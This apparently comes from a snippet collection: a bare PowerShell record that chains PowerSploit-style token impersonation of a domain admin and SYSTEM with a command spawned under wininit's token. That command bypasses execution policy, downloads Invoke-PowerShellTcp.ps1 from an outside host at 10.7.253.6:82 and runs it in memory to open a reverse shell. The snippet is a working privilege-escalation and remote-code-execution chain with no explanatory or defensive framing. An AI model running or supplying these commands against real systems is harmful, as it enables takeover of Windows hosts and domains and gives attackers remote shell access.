---
id: 9452b0ee-76ac-43df-8928-67e375b870bd
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:30.139666+00:00'
updated_at: '2023-04-10T20:37:38.235079+00:00'
---

# Code Snippet 9452b0ee

**Language**: Powershell

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```


